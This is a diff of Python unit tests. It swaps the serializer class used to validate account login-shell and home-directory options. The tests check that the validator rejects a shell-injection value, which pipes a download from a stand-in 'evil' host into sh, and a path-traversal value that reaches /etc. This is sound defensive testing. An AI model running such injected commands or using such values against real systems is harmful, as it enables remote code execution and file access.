@@ -196,27 +196,27 @@ class GlauthPathOptionValidationTest(test.APITestCase):
     context via setup_linux_related_data."""
 
     def test_login_shell_rejects_shell_injection(self):
-        serializer = marketplace_serializers.GLAuthPluginOptionsSerializer(
+        serializer = marketplace_serializers.AccountOptionsSerializer(
             data={"login_shell": "/bin/bash; curl http://evil | sh"}
         )
         self.assertFalse(serializer.is_valid())
         self.assertIn("login_shell", serializer.errors)
 
     def test_login_shell_accepts_valid_path(self):
-        serializer = marketplace_serializers.GLAuthPluginOptionsSerializer(
+        serializer = marketplace_serializers.AccountOptionsSerializer(
             data={"login_shell": "/bin/zsh"}
         )
         self.assertTrue(serializer.is_valid(), serializer.errors)
 
     def test_homedir_prefix_rejects_traversal(self):
-        serializer = marketplace_serializers.HeappePluginOptionsSerializer(
+        serializer = marketplace_serializers.AccountOptionsSerializer(
             data={"homedir_prefix": "/home/../../etc/"}
         )
         self.assertFalse(serializer.is_valid())
         self.assertIn("homedir_prefix", serializer.errors)
 
     def test_homedir_prefix_accepts_valid_prefix(self):
-        serializer = marketplace_serializers.HeappePluginOptionsSerializer(
+        serializer = marketplace_serializers.AccountOptionsSerializer(
             data={"homedir_prefix": "/home/"}
         )
         self.assertTrue(serializer.is_valid(), serializer.errors)
